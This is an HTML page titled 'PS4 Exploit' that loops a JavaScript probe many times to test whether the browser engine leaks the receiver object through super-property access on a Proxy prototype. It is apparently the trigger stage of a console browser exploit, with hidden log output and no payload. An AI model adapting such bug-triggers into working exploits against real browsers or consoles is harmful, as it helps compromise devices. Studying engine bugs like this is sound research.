<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PS4 Exploit</title>
    <style>
        body { background: #000; margin: 0; }
    </style>
</head>
<body>
    <!-- Elementos fantasmas para o código JS -->
    <div id="progress" style="display:none!important"></div>
    <div id="logs" style="display:none!important"></div>

<script>
// MAIN.JS INLINE - INÍCIO
const MAX_ITERATIONS = 1e5;
const LOG_INTERVAL = 100;

function log(message, isError = false) {
    const logElement = document.getElementById('logs');
    const timestamp = new Date().toLocaleTimeString();
    const color = isError ? 'red' : '#0f0';
    logElement.innerHTML += `<span style="color:${color}">[${timestamp}] ${message}</span><br>`;
    logElement.scrollTop = logElement.scrollHeight;
}

function updateProgress(iteration) {
    const percent = ((iteration / MAX_ITERATIONS) * 100).toFixed(2);
    document.getElementById('progress').textContent = `Progresso: ${percent}%`;
}

function assert(x, label) {
    if (!x) {
        log(`[FALHA] ${label}`, true);
        return false;
    }
    log(`[SUCESSO] ${label}`);
    return true;
}

(function() {
    let completedIterations = 0;
    
    function runTests() {
        try {
            for (let i = 0; i < MAX_ITERATIONS; i++) {
                try {
                    let r = (() => {
                        class Leaker1 {
                            leak() { return super.foo; }
                        }
                        Leaker1.prototype.__proto__ = new Proxy({}, {get(t,p,r) { return r; }});
                        return Leaker1.prototype.leak();
                    })();
                    assert(r === undefined, `GetById #${i}: ${r}`);
                } catch(e) { log(`[ERRO] GetById: ${e.message}`, true); }

                try {
                    let r = (() => {
                        class Leaker2 {
                            leak() { return super[Math.random() < 0.5 ? "foo" : "bar"]; }
                        }
                        Leaker2.prototype.__proto__ = new Proxy({}, {get(t,p,r) { return r; }});
                        return Leaker2.prototype.leak();
                    })();
                    assert(r === undefined, `GetByVal #${i}: ${r}`);
                } catch(e) { log(`[ERRO] GetByVal: ${e.message}`, true); }

                try {
                    let r = (() => {
                        let receiver;
                        class Leaker3 {
                            leak() { super.foo = {}; return receiver; }
                        }
                        Leaker3.prototype.__proto__ = new Proxy({}, {set(t,p,v,r) { receiver = r; return true; }});
                        return new Leaker3().leak();
                    })();
                    assert(r === undefined, `SetById #${i}: ${r}`);
                } catch(e) { log(`[ERRO] SetById: ${e.message}`, true); }

                try {
                    let r = (() => {
                        let receiver;
                        class Leaker4 {
                            leak() { super[Math.random() < 0.5 ? "foo" : "bar"] = {}; return receiver; }
                        }
                        Leaker4.prototype.__proto__ = new Proxy({}, {set(t,p,v,r) { receiver = r; return true; }});
                        return new Leaker4().leak();
                    })();
                    assert(r === undefined, `SetByVal #${i}: ${r}`);
                } catch(e) { log(`[ERRO] SetByVal: ${e.message}`, true); }

                completedIterations = i;
                if (i % LOG_INTERVAL === 0) {
                    updateProgress(i);
                    new Promise(resolve => setTimeout(resolve, 0));
                }
            }
            log("Teste completo!");
        } catch(e) { log(`[ERRO GLOBAL] ${e.message}`, true); }
    }

    log("Iniciando exploit...");
    setTimeout(runTests, 1000);
})();
// MAIN.JS INLINE - FIM
</script>
</body>
</html>
